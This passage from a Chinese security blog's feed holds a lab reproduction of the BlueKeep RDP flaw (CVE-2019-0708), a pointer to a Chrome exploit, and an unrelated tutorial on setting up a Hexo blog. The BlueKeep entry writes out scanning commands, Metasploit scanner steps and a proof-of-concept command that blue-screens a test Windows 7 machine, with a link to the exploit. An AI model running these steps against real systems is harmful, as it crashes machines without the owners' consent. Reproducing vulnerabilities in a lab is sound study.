EXPexp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境</summary>
      
    
    
    
    
    <category term="chrome_bug" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-0708/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-0708/</id>
    <published>2022-08-09T03:17:04.055Z</published>
    <updated>2022-08-09T03:26:26.580Z</updated>
    
    <content type="html"><![CDATA[<p>2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。</p><p>影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7</p><h1 id="蓝屏"><a href="#蓝屏" class="headerlink" title="蓝屏"></a>蓝屏</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP：192.168.119.128</p><p>靶机：win7 IP:192.168.119.139 (开放3389端口)</p><p>工具：RDP漏洞扫描工具、MSF</p><p>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>nmap对win7端口扫描:</p><p><img src="https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png" alt="nmap扫描3389.PNG"></p><p>RDP工具在win7上扫描靶机:<code>0708detector.exe -t 192.168.119.139 -p 3389</code></p><p><img src="https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png" alt="漏扫工具扫描3389（win7自身）.PNG"></p><p>启动MSF<br>查找漏洞： <code>search 0708</code></p><p>利用漏洞扫描模块： <code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code></p><p>查看参数： <code>show options</code></p><p>设置靶机IP： <code>set rhosts 192.168.119.139</code></p><p>运行：<code>run</code></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>在kali中安装pip3,安装impacket库。下载poc。<br>切进目录CVE-2019-0708</p><p>开始攻击： <code>python3 crashpoc.py 192.168.119.139 64(系统类型)</code></p><p>攻击成功，win7变为蓝屏。</p><p><img src="https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png" alt="win7蓝屏.PNG"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h4 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h4><p>RDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。<br>基本层次结构：</p><ul><li>网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。</li><li>ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。</li><li>虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。</li><li>加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。</li><li>功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，</li></ul><p>连接过程说明：</p><ul><li>客户端连接服务器</li><li>ISO数据层建立连接</li><li>发送初始协议相关信息，接收加密、解密秘钥</li><li>虚拟通道申请</li><li>加密形式发送客户端系统信息，同时验证加密协议</li><li>平台软件证书验证</li><li>各功能建立连接，各功能数据传输，功能实现。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。&lt;/p&gt;
&lt;p&gt;影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="windows漏洞" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Win10下使用Hexo搭建个人博客</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-08-07T08:48:45.000Z</published>
    <updated>2022-08-07T13:51:00.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code>npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code>cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code>hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code>hexo new &quot;文章标题&quot;</code></pre><p>在目录&#x2F;source&#x2F;_posts&#x2F;下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code>cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: &quot;此处为仓库地址&quot;</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code>git config --global user.email &quot;xxx(此处为邮箱)&quot;  git config --global user.name &quot;xxx(此处为用户名)&quot;  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载安装git、nodejs&quot;&gt;&lt;a href=&quot;#下载安装git、nodejs&quot; class=&quot;headerlink&quot; title=&quot;下载安装git、nodejs&quot;&gt;&lt;/a&gt;下载安装git、nodejs&lt;/h2&gt;&lt;p&gt;下载地址: &lt;/p&gt;
&lt;p&gt;git: &lt;a </summary>
      
    
    
    
    
  </entry>
  
</feed>
